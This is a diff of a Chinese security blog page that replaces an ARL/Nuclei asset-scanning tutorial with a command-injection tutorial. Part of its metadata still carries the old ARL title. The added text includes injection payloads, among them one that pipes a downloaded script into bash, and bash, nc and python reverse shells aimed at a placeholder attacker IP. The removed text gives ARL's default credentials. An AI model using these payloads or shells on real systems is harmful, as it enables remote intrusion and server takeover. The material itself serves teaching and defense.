@@ -1,94 +1,133 @@
-<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。"><title>信息收集落地工具：灯塔 ARL 与 Nuclei 联动</title><link rel=canonical href=https://souljian.cn/p/751088110/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="信息收集落地工具：灯塔 ARL 与 Nuclei 联动"><meta property='og:description' content="灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。"><meta property='og:url' content='https://souljian.cn/p/751088110/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='信息收集'><meta property='article:tag' content='ARL'><meta property='article:tag' content='nuclei'><meta property='article:tag' content='资产测绘'><meta property='article:tag' content='渗透测试'><meta property='article:published_time' content='2026-08-30T03:00:00+08:00'><meta property='article:modified_time' content='2026-08-30T03:00:00+08:00'><meta name=twitter:title content="信息收集落地工具：灯塔 ARL 与 Nuclei 联动"><meta name=twitter:description content="灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。"><title>命令注入原理与防御</title><link rel=canonical href=https://souljian.cn/p/751088110/><link rel=stylesheet href=/scss/style.min.81579ea678e30582aa60028bfe3192821d6c0fee666ee279be318fb5b558916b.css><meta property='og:title' content="信息收集落地工具：灯塔 ARL 与 Nuclei 联动"><meta property='og:description' content="灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。"><meta property='og:url' content='https://souljian.cn/p/751088110/'><meta property='og:site_name' content='SoulJian小站'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='命令注入'><meta property='article:tag' content='注入漏洞'><meta property='article:tag' content='OS命令'><meta property='article:tag' content='Web安全'><meta property='article:tag' content='RCE'><meta property='article:published_time' content='2026-08-29T14:00:00+08:00'><meta property='article:modified_time' content='2026-08-30T10:00:00+08:00'><meta name=twitter:title content="信息收集落地工具：灯塔 ARL 与 Nuclei 联动"><meta name=twitter:description content="灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
 <span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_d0e0f681fd935e1f.jpg width=300 height=303 class=site-logo loading=lazy alt=Avatar>
 </a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>SoulJian小站</a></h1><h2 class=site-description>人生所有的痛苦，皆来自于我执</h2></div></header><ol class=menu-social><li><a href=https://github.com/souljian03 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
 <span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
 <span>搜索</span></a></li><li><a href=/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
 <span>友情链接</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
-<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一原理为什么用落地工具联动>一、原理：为什么用“落地工具”联动</a></li><li><a href=#二影响>二、影响</a></li><li><a href=#三灯塔-arl-使用>三、灯塔 ARL 使用</a><ol><li><a href=#部署docker>部署（Docker）</a></li><li><a href=#基本使用>基本使用</a></li></ol></li><li><a href=#四nuclei-与-arl-联动>四、Nuclei 与 ARL 联动</a><ol><li><a href=#1-导出资产清单>1. 导出资产清单</a></li><li><a href=#2-nuclei-批量验证>2. Nuclei 批量验证</a></li><li><a href=#3-联动流程>3. 联动流程</a></li></ol></li><li><a href=#五操作步骤>五、操作步骤</a></li><li><a href=#六检测与防御对立面>六、检测与防御（对立面）</a></li><li><a href=#七小结>七、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%B7%A5%E5%85%B7%E7%B1%BB/ style=background-color:#2a9d8f;color:#fff>工具类</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088110/>信息收集落地工具：灯塔 ARL 与 Nuclei 联动</a></h2><h3 class=article-subtitle>灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#写在前面合法学习边界>写在前面：合法学习边界</a></li><li><a href=#一原理>一、原理</a></li><li><a href=#二命令注入攻击链>二、命令注入攻击链</a></li><li><a href=#三常见注入载体>三、常见注入载体</a><ol><li><a href=#1-ping-命令注入>1. Ping 命令注入</a></li><li><a href=#2-文件路径注入>2. 文件路径注入</a></li><li><a href=#3-下载转换工具>3. 下载/转换工具</a></li></ol></li><li><a href=#四反弹-shell>四、反弹 Shell</a></li><li><a href=#五危害>五、危害</a></li><li><a href=#六防御措施>六、防御措施</a></li><li><a href=#七小结>七、小结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%B7%A5%E5%85%B7%E7%B1%BB/ style=background-color:#2a9d8f;color:#fff>工具类</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/751088110/>信息收集落地工具：灯塔 ARL 与 Nuclei 联动</a></h2><h3 class=article-subtitle>灯塔 ARL 资产收集 + Nuclei 模板扫描联动：子域名/端口/指纹收集，导出资产清单批量验证漏洞，完整操作步骤与检测防御。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
 <time class=article-time--published datetime=2026-08-30T03:00:00+08:00>Aug 30, 2026</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>资产收集工具只用于授权目标。对非授权资产批量扫描可能触犯法律并造成服务影响。</p><h2 id=一原理为什么用落地工具联动>一、原理：为什么用“落地工具”联动</h2><p>手工收集慢、容易漏。把“收集 → 验证”做成流水线：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>灯塔 ARL：自动收集子域/端口/指纹/漏洞（资产入库）
-</span></span><span class=line><span class=cl>Nuclei：用模板对资产批量验证已知漏洞
-</span></span><span class=line><span class=cl>联动：ARL 收资产 → 导出清单 → Nuclei 批量打
-</span></span></code></pre></td></tr></table></div></div><p>一句话：<strong>ARL 管“有什么”，Nuclei 管“哪个能打”</strong>。</p><h2 id=二影响>二、影响</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>资产收集自动化、覆盖面大
-</span></span><span class=line><span class=cl>批量验证，显著提升渗透命中率
-</span></span><span class=line><span class=cl>结果沉淀成资产清单，可复用
-</span></span></code></pre></td></tr></table></div></div><p>风险等级：作为工具无风险，滥用才是风险（注意授权）。</p><h2 id=三灯塔-arl-使用>三、灯塔 ARL 使用</h2><h3 id=部署docker>部署（Docker）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git clone https://github.com/TophantTechnology/ARL.git
-</span></span><span class=line><span class=cl><span class=nb>cd</span> ARL/docker <span class=o>&amp;&amp;</span> docker-compose up -d
-</span></span><span class=line><span class=cl><span class=c1># 解释：ARL 用 Docker 部署，默认 web 端口 5003</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=基本使用>基本使用</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>登录 Web 界面（默认 admin/arlpass）
-</span></span><span class=line><span class=cl>新建任务 → 填目标域名 → 开始收集
-</span></span><span class=line><span class=cl>结果：子域名、IP、端口、指纹、漏洞、证书
-</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span><span class=lnt>5
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>常用功能：
-</span></span><span class=line><span class=cl>- 子域名收集（字典+被动）
-</span></span><span class=line><span class=cl>- 端口/服务识别
-</span></span><span class=line><span class=cl>- 指纹识别（CMS/框架）
-</span></span><span class=line><span class=cl>- 内置漏洞探测（部分 POC）
-</span></span></code></pre></td></tr></table></div></div><h2 id=四nuclei-与-arl-联动>四、Nuclei 与 ARL 联动</h2><h3 id=1-导出资产清单>1. 导出资产清单</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>ARL 结果里导出子域名/URL 列表（csv/txt）
-</span></span><span class=line><span class=cl>或用工具把域名补全成 URL：httpx -l domains.txt
-</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># httpx 批量探测存活并生成 URL</span>
-</span></span><span class=line><span class=cl>httpx -l domains.txt -mc 200,301,302 -o urls.txt
-</span></span><span class=line><span class=cl><span class=c1># 解释：-mc 过滤状态码，得到可访问的 URL 列表</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=2-nuclei-批量验证>2. Nuclei 批量验证</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span><span class=lnt>3
-</span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nuclei -l urls.txt -severity critical,high -o result.txt
-</span></span><span class=line><span class=cl><span class=c1># 解释：对所有 URL 批量跑高危模板，输出命中</span>
-</span></span><span class=line><span class=cl>nuclei -u http://目标 -t cves/ -t exposures/
-</span></span><span class=line><span class=cl><span class=c1># 解释：按模板类别指定（CVE/信息泄露）</span>
-</span></span></code></pre></td></tr></table></div></div><h3 id=3-联动流程>3. 联动流程</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span><span class=lnt>2
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>ARL 收集 → 导出域名 → httpx 存活 → nuclei 验证 →
-</span></span><span class=line><span class=cl>结果去重 → 人工复测高危 → 写报告
-</span></span></code></pre></td></tr></table></div></div><h2 id=五操作步骤>五、操作步骤</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+<time class=article-time--reading>阅读时长: 2 分钟</time></div></footer></div></header><section class=article-content><h2 id=写在前面合法学习边界>写在前面：合法学习边界</h2><p>命令注入测试只在授权环境进行。对非授权系统执行命令注入可能触犯法律。</p><h2 id=一原理>一、原理</h2><p>命令注入的本质是：用户输入拼接到操作系统命令中，被 shell 当作命令执行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>第 1 步：Docker 部署 ARL，确认授权目标
-</span></span><span class=line><span class=cl>第 2 步：ARL 建任务收集子域/端口/指纹
-</span></span><span class=line><span class=cl>第 3 步：导出资产清单，httpx 生成 URL
-</span></span><span class=line><span class=cl>第 4 步：nuclei 批量验证高危漏洞
-</span></span><span class=line><span class=cl>第 5 步：去重并人工复测命中项
-</span></span><span class=line><span class=cl>第 6 步：沉淀资产清单，纳入后续测试
-</span></span></code></pre></td></tr></table></div></div><h2 id=六检测与防御对立面>六、检测与防御（对立面）</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>正常代码：
+</span></span><span class=line><span class=cl>  $ip = $_GET[&#39;ip&#39;];
+</span></span><span class=line><span class=cl>  system(&#34;ping -c 1 &#34; . $ip);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>输入 127.0.0.1 变成：
+</span></span><span class=line><span class=cl>  ping -c 1 127.0.0.1  -- 正常
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>输入 127.0.0.1;whoami 变成：
+</span></span><span class=line><span class=cl>  ping -c 1 127.0.0.1;whoami  -- 注入成功，执行 whoami
+</span></span></code></pre></td></tr></table></div></div><h2 id=二命令注入攻击链>二、命令注入攻击链</h2><img src=/img/cmd-injection-chain.svg alt=命令注入攻击链拓扑图><h2 id=三常见注入载体>三、常见注入载体</h2><h3 id=1-ping-命令注入>1. Ping 命令注入</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>输入：127.0.0.1;whoami
+</span></span><span class=line><span class=cl>命令：ping -c 1 127.0.0.1;whoami
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>分隔符：
+</span></span><span class=line><span class=cl>  ;    → 命令分隔（前后都执行）
+</span></span><span class=line><span class=cl>  |    → 管道符（前输出→后输入）
+</span></span><span class=line><span class=cl>  &amp;&amp;   → 逻辑与（前成功才执行后）
+</span></span><span class=line><span class=cl>  ||   → 逻辑或（前失败才执行后）
+</span></span><span class=line><span class=cl>  `    → 反引号（执行反引号内命令）
+</span></span><span class=line><span class=cl>  $(  → 命令替换（$(whoami)）
+</span></span></code></pre></td></tr></table></div></div><h3 id=2-文件路径注入>2. 文件路径注入</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>大量资产请求/批量 POC → WAF/态势感知识别
-</span></span><span class=line><span class=cl>对管理后台/敏感接口做访问控制
-</span></span><span class=line><span class=cl>收敛暴露面，及时修漏洞
-</span></span><span class=line><span class=cl>资产未授权扫描 → 边界防护与告警
-</span></span></code></pre></td></tr></table></div></div><h2 id=七小结>七、小结</h2><p>ARL + Nuclei 是把“收集→验证”串成流水线的标配：<strong>ARL 收资产入库，httpx 转 URL，nuclei 批量验证</strong>。这套流程自动化程度高、命中率好，是信息收集落地的主力组合。关键还是先确认授权，再上工具。</p><p><strong>再次提醒：只对授权目标使用。</strong></p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/>信息收集</a>
-<a href=/tags/arl/>ARL</a>
-<a href=/tags/nuclei/>Nuclei</a>
-<a href=/tags/%E8%B5%84%E4%BA%A7%E6%B5%8B%E7%BB%98/>资产测绘</a>
-<a href=/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/>渗透测试</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
-<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088107/><div class=article-details><h2 class=article-title>信息收集进阶：Google 语法、JS 分析与云资产测绘</h2></div></a></article><article><a href=/p/751088096/><div class=article-details><h2 class=article-title>Yakit 深度实战：模块、插件与脚本</h2></div></a></article><article><a href=/p/751088079/><div class=article-details><h2 class=article-title>小程序抓包配置实战（Burp + 模拟器/真机）</h2></div></a></article><article><a href=/p/751088033/><div class=article-details><h2 class=article-title>信息收集：子域名枚举与资产测绘</h2></div></a></article><article><a href=/p/751088010/><div class=article-details><h2 class=article-title>信息收集：nmap 与子域名枚举</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>输入：/tmp/shell;bash shell
+</span></span><span class=line><span class=cl>危险函数：
+</span></span><span class=line><span class=cl>  PHP: system() / exec() / passthru() / shell_exec() / popen()
+</span></span><span class=line><span class=cl>  Python: os.system() / subprocess.call()
+</span></span><span class=line><span class=cl>  Java: Runtime.getRuntime().exec()
+</span></span></code></pre></td></tr></table></div></div><h3 id=3-下载转换工具>3. 下载/转换工具</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>ffmpeg/wget/curl 等工具
+</span></span><span class=line><span class=cl>输入：http://x.com/x.png;curl x.sh|bash
+</span></span><span class=line><span class=cl>命令：ffmpeg -i &#34;用户输入&#34; output.mp4
+</span></span></code></pre></td></tr></table></div></div><h2 id=四反弹-shell>四、反弹 Shell</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Linux bash：
+</span></span><span class=line><span class=cl>  bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Linux nc：
+</span></span><span class=line><span class=cl>  nc -e /bin/sh 攻击者IP 4444
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Linux python：
+</span></span><span class=line><span class=cl>  python -c &#39;import socket,subprocess,os;s=socket.socket();s.connect((&#34;攻击者IP&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
+</span></span></code></pre></td></tr></table></div></div><h2 id=五危害>五、危害</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>① 执行任意系统命令
+</span></span><span class=line><span class=cl>② 读取/修改服务器文件
+</span></span><span class=line><span class=cl>③ 提权
+</span></span><span class=line><span class=cl>④ 反弹 Shell（远程控制）
+</span></span><span class=line><span class=cl>⑤ 下载工具/持久化
+</span></span><span class=line><span class=cl>⑥ 横向移动内网
+</span></span></code></pre></td></tr></table></div></div><h2 id=六防御措施>六、防御措施</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>1. 参数白名单
+</span></span><span class=line><span class=cl>   只允许 IP 格式 / 数字 / 预定义值
+</span></span><span class=line><span class=cl>   PHP: if(!preg_match(&#39;/^[\d.]+$/&#39;, $ip)) { die(&#39;Invalid&#39;); }
